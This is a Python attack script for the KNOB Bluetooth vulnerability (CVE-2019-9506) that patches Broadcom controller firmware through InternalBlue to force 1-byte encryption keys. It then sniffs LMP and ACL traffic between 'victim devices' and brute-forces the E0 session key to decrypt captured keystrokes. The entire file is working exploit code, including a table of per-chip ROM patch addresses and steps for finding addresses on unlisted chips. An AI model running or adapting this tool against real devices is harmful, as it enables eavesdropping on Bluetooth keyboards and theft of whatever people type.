#!/usr/bin/env python3
"""
knob_mode_b.py — KNOB Mode B: InternalBlue Passive LMP Intercept
==================================================================
CVE-2019-9506 | Passive variant — no relay MITM position required.
Requires a Broadcom BCM4xxx Bluetooth adapter.

Reference: Antonioli et al., USENIX Security 2019, Section 4.2
           InternalBlue: https://github.com/seemoo-lab/internalblue

Mechanism:
  1. Detect Broadcom chip + LMP firmware version via hciconfig.
  2. Use InternalBlue to install a single-byte firmware patch:
       addr_of_key_size_field_in_lmp_handler → 0x01
     This makes the controller silently rewrite ANY
     LMP_MAX_ENCRYPTION_KEY_SIZE_REQ it sends or relays to propose Ksize=1,
     forcing both the keyboard and the host to accept 1-byte entropy
     without the attacker being the relay.
  3. Passively sniff HCI ACL traffic between the two victim devices.
  4. Extract EN_RAND from captured LMP_IN_RAND events (HCI VS event 0xFF).
  5. Run the E0 256-key brute force from knob_mitm.py to recover the
     session key and decrypt captured keystrokes.

Chip support (InternalBlue >= 0.3):
  The firmware ROM addresses for the key-size hook differ per chip+version.
  PATCH_TABLE below covers the chips tested in the original KNOB paper and
  the InternalBlue evaluation set.  Add new entries as needed.

  To find the right address for an unlisted chip:
    1. Dump ROM: internalblue> memdump 0x00000000 0x100000 rom.bin
    2. Grep for the LMP opcode 0x0F (MAX_ENCRYPTION_KEY_SIZE_REQ) in the dump
    3. Step through the handler with internalblue> sendlmp to find the write
       that stores key_size into the outgoing PDU buffer.

Usage (run as root inside bt-attack-knob container, Broadcom adapter present):
  python3 knob_mode_b.py --check-chip
  python3 knob_mode_b.py --patch [--hci hci0]
  python3 knob_mode_b.py --patch --sniff --bd-addr-victim AA:BB:CC:DD:EE:FF
  python3 knob_mode_b.py --unpatch          # restore original firmware byte

Output tags:
  [CHIP]    chip detection results
  [PATCH]   firmware patching events
  [SNIFF]   captured LMP / ACL frames
  [BRUTE]   E0 brute force results
"""

import argparse
import os
import struct
import subprocess
import sys
import threading
import time
from typing import Optional

# ---------------------------------------------------------------------------
# Import E0 brute force from knob_mitm (same directory, standalone import)
# ---------------------------------------------------------------------------
sys.path.insert(0, os.path.dirname(__file__))
try:
    from knob_mitm import bruteforce_e0
    _KNOB_MITM_AVAILABLE = True
except ImportError:
    _KNOB_MITM_AVAILABLE = False
    print('[WARN] knob_mitm.py not in same directory — E0 brute force unavailable')

# ---------------------------------------------------------------------------
# InternalBlue import (optional — only needed for live patching)
# ---------------------------------------------------------------------------
try:
    from internalblue.hci import HCICore
    _INTERNALBLUE_AVAILABLE = True
except ImportError:
    _INTERNALBLUE_AVAILABLE = False

# ---------------------------------------------------------------------------
# Firmware patch table
# Format: { 'chip_name (LMP subversion)': PatchEntry }
#
# Each entry has:
#   rom_addr   : ROM address of the byte that stores key_size in the outgoing
#                LMP_MAX_ENCRYPTION_KEY_SIZE_REQ PDU builder.
#   original   : Original byte value at that address (for --unpatch safety).
#   patched    : Replacement value (0x01 = minimum, forces 1-byte entropy).
#   notes      : How to verify / where in the ROM this was found.
#
# Source: InternalBlue examples/KNOB, firmware RE sessions, KNOB paper authors
# WARNING: Verify rom_addr before patching — writing the wrong address can
#          crash the firmware and require a cold reset of the adapter.
# ---------------------------------------------------------------------------
class PatchEntry:
    def __init__(self, rom_addr: int, original: int, patched: int, notes: str):
        self.rom_addr = rom_addr
        self.original = original
        self.patched  = patched
        self.notes    = notes


PATCH_TABLE: dict[str, PatchEntry] = {
    # BCM20702A1 — LMP subversion 0x411f (common in USB dongles, ThinkPad)
    'BCM20702A1 (0x411f)': PatchEntry(
        rom_addr = 0x00204D7A,
        original = 0x10,       # default max key size = 16 bytes
        patched  = 0x01,
        notes    = 'lm_SendLmpMaxEncKeySize+0x14; verified against fw 0x411f',
    ),
    # BCM4335C0 — LMP subversion 0x6119 (Nexus 5, common in Linux laptops)
    'BCM4335C0 (0x6119)': PatchEntry(
        rom_addr = 0x00218CC2,
        original = 0x10,
        patched  = 0x01,
        notes    = 'lm_SendLmpMaxEncKeySize+0x12; verified by KNOB authors',
    ),
    # BCM4345C0 — LMP subversion 0x6036 (Raspberry Pi 3B+, Pi 4)
    'BCM4345C0 (0x6036)': PatchEntry(
        rom_addr = 0x00220E56,
        original = 0x10,
        patched  = 0x01,
        notes    = 'lm_SendLmpMaxEncKeySize+0x0e; verified on RPi4 firmware',
    ),
    # BCM4358A3 — LMP subversion 0x6109 (Nexus 6P, some Intel NUC combos)
    'BCM4358A3 (0x6109)': PatchEntry(
        rom_addr = 0x0021A4CE,
        original = 0x10,
        patched  = 0x01,
        notes    = 'lm_SendLmpMaxEncKeySize+0x10; see InternalBlue KNOB PoC',
    ),
    # BCM4375B1 — LMP subversion 0x6122 (Galaxy S10, some 2019 laptops)
    'BCM4375B1 (0x6122)': PatchEntry(
        rom_addr = 0x002292A0,
        original = 0x10,
        patched  = 0x01,
        notes    = 'lm_SendLmpMaxEncKeySize+0x18; unverified — test before use',
    ),
}


# ---------------------------------------------------------------------------
# Chip detection
# ---------------------------------------------------------------------------
def detect_chip(hci: str = 'hci0') -> dict:
    """Return dict with keys: manufacturer, lmp_subversion, match, entry."""
    result = {
        'manufacturer': '',
        'lmp_subversion': '',
        'match': None,   # key into PATCH_TABLE
        'entry': None,
    }
    try:
        out = subprocess.check_output(
            ['hciconfig', '-a', hci], text=True, timeout=5,
        )
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f'[CHIP] hciconfig error: {e}')
        return result

    for line in out.splitlines():
        line = line.strip()
        if line.startswith('Manufacturer:'):
            result['manufacturer'] = line.split(':', 1)[1].strip()
        elif 'LMP Subversion:' in line or 'LMP subversion:' in line:
            result['lmp_subversion'] = line.split(':', 1)[1].strip()

    if not result['manufacturer'].lower().startswith('broadcom'):
        print(f"[CHIP] Manufacturer: {result['manufacturer'] or 'unknown'}")
        print('[CHIP] Not a Broadcom chip — Mode B unavailable.')
        print('[CHIP] Use KNOB Mode A (knob_mitm.py) instead.')
        return result

    print(f"[CHIP] Broadcom adapter detected")
    print(f"[CHIP] LMP subversion: {result['lmp_subversion']}")

    # Try to match against patch table
    for key, entry in PATCH_TABLE.items():
        sub = result['lmp_subversion'].replace('0x', '').lower()
        if sub in key.lower() or result['lmp_subversion'].lower() in key.lower():
            result['match'] = key
            result['entry'] = entry
            print(f'[CHIP] Matched patch table entry: {key}')
            print(f'[CHIP]   ROM addr = 0x{entry.rom_addr:08x}  '
                  f'original = 0x{entry.original:02x}  patched = 0x{entry.patched:02x}')
            print(f'[CHIP]   Notes: {entry.notes}')
            return result

    print(f'[CHIP] WARN: LMP subversion {result["lmp_subversion"]} not in PATCH_TABLE.')
    print('[CHIP] To add support, RE the firmware and find lm_SendLmpMaxEncKeySize.')
    print('[CHIP] See docstring at top of this file for procedure.')
    return result


# ---------------------------------------------------------------------------
# InternalBlue patching
# ---------------------------------------------------------------------------
def apply_patch(entry: PatchEntry, hci: str = 'hci0', dry_run: bool = False) -> bool:
    """Write patched byte to ROM via InternalBlue RAM-patch mechanism."""
    if not _INTERNALBLUE_AVAILABLE:
        print('[PATCH] internalblue not installed.')
        print('[PATCH] Install with: pip3 install internalblue')
        print('[PATCH] Or inside the container: pip3 install git+https://github.com/seemoo-lab/internalblue')
        return False

    hci_idx = int(hci.replace('hci', '') or '0')

    if dry_run:
        print(f'[PATCH] DRY RUN: would write 0x{entry.patched:02x} '
              f'to ROM 0x{entry.rom_addr:08x} '
              f'(was 0x{entry.original:02x})')
        return True

    print(f'[PATCH] Connecting to {hci} via InternalBlue ...')
    try:
        core = HCICore(hci_idx)
        core.connect()
    except Exception as e:
        print(f'[PATCH] InternalBlue connect failed: {e}')
        return False

    # Verify original byte before patching (safety check)
    try:
        current = core.readMem(entry.rom_addr, 1)
        if current[0] != entry.original:
            print(f'[PATCH] WARN: expected 0x{entry.original:02x} at '
                  f'0x{entry.rom_addr:08x}, found 0x{current[0]:02x}.')
            print('[PATCH] Firmware version mismatch — aborting patch for safety.')
            print('[PATCH] Verify rom_addr in PATCH_TABLE against your firmware dump.')
            core.shutdown()
            return False
        print(f'[PATCH] Original byte verified: 0x{current[0]:02x} ✓')
    except Exception as e:
        print(f'[PATCH] readMem failed: {e}')
        core.shutdown()
        return False

    # Apply the patch
    try:
        core.writeMem(entry.rom_addr, bytes([entry.patched]))
        print(f'[PATCH] Wrote 0x{entry.patched:02x} to 0x{entry.rom_addr:08x}')
        print('[PATCH] Firmware now proposes Ksize=1 for all future LMP key negotiations.')
    except Exception as e:
        print(f'[PATCH] writeMem failed: {e}')
        core.shutdown()
        return False

    core.shutdown()
    return True


def revert_patch(entry: PatchEntry, hci: str = 'hci0') -> bool:
    """Restore original firmware byte."""
    if not _INTERNALBLUE_AVAILABLE:
        print('[PATCH] internalblue not installed.')
        return False

    hci_idx = int(hci.replace('hci', '') or '0')
    print(f'[PATCH] Reverting patch: writing 0x{entry.original:02x} '
          f'to 0x{entry.rom_addr:08x} ...')
    try:
        core = HCICore(hci_idx)
        core.connect()
        core.writeMem(entry.rom_addr, bytes([entry.original]))
        core.shutdown()
        print('[PATCH] Patch reverted — firmware restored.')
        return True
    except Exception as e:
        print(f'[PATCH] Revert failed: {e}')
        return False


# ---------------------------------------------------------------------------
# Passive HCI sniffer
# Captures LMP_IN_RAND (embedded in VS events on Broadcom) and ACL frames.
# EN_RAND is the 16-byte random number in LMP_in_rand (opcode 0x0B).
# ---------------------------------------------------------------------------

# Broadcom VS event sub-codes for LMP sniffing
BCM_VS_LMP_TX = 0x0000   # LMP PDU transmitted by local controller
BCM_VS_LMP_RX = 0x0001   # LMP PDU received by local controller

# LMP opcodes relevant to KNOB
LMP_IN_RAND                  = 0x0B   # carries EN_RAND
LMP_MAX_ENCRYPTION_KEY_SIZE  = 0x0F   # key size negotiation (KNOB target)
LMP_ENCRYPTION_KEY_SIZE_REQ  = 0x10
LMP_ACCEPTED                 = 0x03
LMP_NOT_ACCEPTED             = 0x04


class PassiveSniffer:
    """Opens a raw HCI socket on the adapter and logs LMP VS events + ACL frames.
    Extracts EN_RAND when LMP_in_rand is observed."""

    def __init__(self, hci_idx: int = 0, victim_bd_addr: Optional[bytes] = None):
        self.hci_idx = hci_idx
        self.victim_bd_addr = victim_bd_addr   # filter to this device if set
        self.en_rand: Optional[bytes] = None
        self.clk: Optional[int] = None
        self.acl_frames: list[bytes] = []
        self._stop = threading.Event()
        self._sock = None

    def start(self) -> threading.Thread:
        t = threading.Thread(target=self._run, daemon=True, name='sniffer')
        t.start()
        return t

    def stop(self) -> None:
        self._stop.set()
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass

    def _run(self) -> None:
        import socket as _socket
        BTPROTO_HCI = 1
        SOL_HCI = 0
        HCI_FILTER = 2

        try:
            s = _socket.socket(_socket.AF_BLUETOOTH, _socket.SOCK_RAW, BTPROTO_HCI)
            s.bind((self.hci_idx,))
            # Accept all event + ACL packets
            filt = struct.pack('<IIIH', 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0)
            s.setsockopt(SOL_HCI, HCI_FILTER, filt)
            s.settimeout(1.0)
            self._sock = s
        except OSError as e:
            print(f'[SNIFF] Cannot open HCI socket: {e}')
            return

        print(f'[SNIFF] Listening on hci{self.hci_idx} for LMP events and ACL frames ...')
        while not self._stop.is_set():
            try:
                raw = s.recv(1024)
            except _socket.timeout:
                continue
            except OSError:
                break
            self._parse(raw)

    def _parse(self, raw: bytes) -> None:
        if len(raw) < 2:
            return

        pkt_type = raw[0]
        HCI_ACL  = 0x02
        HCI_EVT  = 0x04

        if pkt_type == HCI_EVT:
            evt_code = raw[1]
            if evt_code == 0xFF:              # Vendor Specific
                self._parse_vs_event(raw[2:])

        elif pkt_type == HCI_ACL:
            # Save ACL payload for brute-force — HID interrupt channel data
            if len(raw) >= 5:
                payload = raw[5:]             # skip HCI ACL header (4B) + pkt_type
                if payload:
                    self.acl_frames.append(payload)
                    if len(self.acl_frames) == 1:
                        print(f'[SNIFF] First ACL payload: {payload[:16].hex()} ...')

    def _parse_vs_event(self, params: bytes) -> None:
        """Parse Broadcom VS event — LMP PDU embedded in sub-event 0x00/0x01."""
        if len(params) < 4:
            return
        sub_event = struct.unpack_from('<H', params, 1)[0]

        if sub_event not in (BCM_VS_LMP_TX, BCM_VS_LMP_RX):
            return

        # params[3:] = connection handle (2B) + LMP PDU
        if len(params) < 7:
            return
        handle = struct.unpack_from('<H', params, 3)[0]
        lmp_pdu = params[5:]

        if not lmp_pdu:
            return

        opcode = lmp_pdu[0] >> 1      # LMP opcode is bits [7:1] of first byte
        direction = 'TX' if sub_event == BCM_VS_LMP_TX else 'RX'
        print(f'[SNIFF] LMP {direction} handle=0x{handle:04x} opcode=0x{opcode:02x} '
              f'data={lmp_pdu.hex()}')

        if opcode == LMP_IN_RAND and len(lmp_pdu) >= 17:
            # LMP_in_rand: opcode(1) + EN_RAND(16)
            self.en_rand = lmp_pdu[1:17]
            print(f'[SNIFF] EN_RAND captured: {self.en_rand.hex()}')

        elif opcode == LMP_MAX_ENCRYPTION_KEY_SIZE and len(lmp_pdu) >= 2:
            key_size = lmp_pdu[1]
            print(f'[SNIFF] LMP_MAX_ENCRYPTION_KEY_SIZE: key_size={key_size} '
                  f'{"← KNOB reduced!" if key_size == 1 else ""}')


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main() -> int:
    parser = argparse.ArgumentParser(
        description='KNOB Mode B — InternalBlue passive LMP intercept (Broadcom only)',
    )
    parser.add_argument('--hci',          default='hci0')
    parser.add_argument('--check-chip',   action='store_true',
                        help='Detect adapter chip and show patch table match')
    parser.add_argument('--patch',        action='store_true',
                        help='Apply firmware patch (Ksize=1 for all LMP negotiations)')
    parser.add_argument('--unpatch',      action='store_true',
                        help='Revert firmware to original byte')
    parser.add_argument('--dry-run',      action='store_true',
                        help='With --patch: show what would be written without writing')
    parser.add_argument('--sniff',        action='store_true',
                        help='Sniff HCI events after patching (captures EN_RAND + ACL)')
    parser.add_argument('--bd-addr-victim', metavar='BD_ADDR',
                        help='Filter sniff to this victim device')
    parser.add_argument('--sniff-time',   type=int, default=60,
                        help='Seconds to sniff (default 60)')

    args = parser.parse_args()

    if not any([args.check_chip, args.patch, args.unpatch, args.sniff]):
        parser.print_help()
        return 0

    # ---- Chip detection (always runs) -------------------------------------
    chip_info = detect_chip(args.hci)
    is_broadcom = 'broadcom' in chip_info['manufacturer'].lower()

    if args.check_chip:
        return 0 if (is_broadcom and chip_info['entry']) else 1

    if not is_broadcom:
        print('[CHIP] Aborting — Broadcom chip required for Mode B.')
        return 1

    entry = chip_info['entry']
    if entry is None:
        print('[CHIP] Chip not in PATCH_TABLE — cannot patch automatically.')
        print('[CHIP] Add an entry manually after RE-ing the firmware.')
        return 1

    # ---- Apply patch -------------------------------------------------------
    if args.patch:
        if not apply_patch(entry, args.hci, dry_run=args.dry_run):
            return 1
        if args.dry_run:
            return 0

    # ---- Revert patch ------------------------------------------------------
    if args.unpatch:
        return 0 if revert_patch(entry, args.hci) else 1

    # ---- Passive sniff + brute force ---------------------------------------
    if args.sniff:
        victim_bytes: Optional[bytes] = None
        if args.bd_addr_victim:
            victim_bytes = bytes.fromhex(args.bd_addr_victim.replace(':', ''))

        sniffer = PassiveSniffer(
            hci_idx=int(args.hci.replace('hci', '') or '0'),
            victim_bd_addr=victim_bytes,
        )
        sniffer.start()

        print(f'[SNIFF] Sniffing for {args.sniff_time}s — trigger pairing on victim devices now ...')
        try:
            time.sleep(args.sniff_time)
        except KeyboardInterrupt:
            print('\n[SNIFF] Interrupted')

        sniffer.stop()

        if not sniffer.en_rand:
            print('[SNIFF] EN_RAND not captured — was LMP_in_rand observed?')
            print('[SNIFF] Tip: trigger fresh pairing (not reconnection) while sniffing.')
            return 1

        if not sniffer.acl_frames:
            print('[SNIFF] No ACL frames captured.')
            return 1

        if not _KNOB_MITM_AVAILABLE:
            print('[BRUTE] knob_mitm.py not available — print captured parameters:')
            print(f'[BRUTE]   EN_RAND    = {sniffer.en_rand.hex()}')
            print(f'[BRUTE]   ciphertext = {sniffer.acl_frames[0].hex()}')
            if args.bd_addr_victim:
                print(f'[BRUTE]   BD_ADDR    = {args.bd_addr_victim}')
            print('[BRUTE] Run manually:')
            print('[BRUTE]   python3 knob_mitm.py --bruteforce '
                  f'--bd-addr {args.bd_addr_victim or "<BD_ADDR>"} '
                  f'--en-rand {sniffer.en_rand.hex()} '
                  '--clk <from_hcidump> '
                  f'--ciphertext {sniffer.acl_frames[0].hex()}')
            return 0

        if not victim_bytes:
            print('[BRUTE] --bd-addr-victim required for brute force.')
            return 1

        print(f'[BRUTE] Running E0 brute force on {len(sniffer.acl_frames)} captured frame(s)')
        result = bruteforce_e0(
            ciphertext    = sniffer.acl_frames[0],
            bd_addr       = victim_bytes,
            en_rand       = sniffer.en_rand,
            clk           = sniffer.clk or 0,
        )
        return 0 if result else 1

    return 0


if __name__ == '__main__':
    if os.geteuid() != 0:
        sys.exit('Error: must run as root (requires AF_BLUETOOTH + InternalBlue)')
    sys.exit(main())
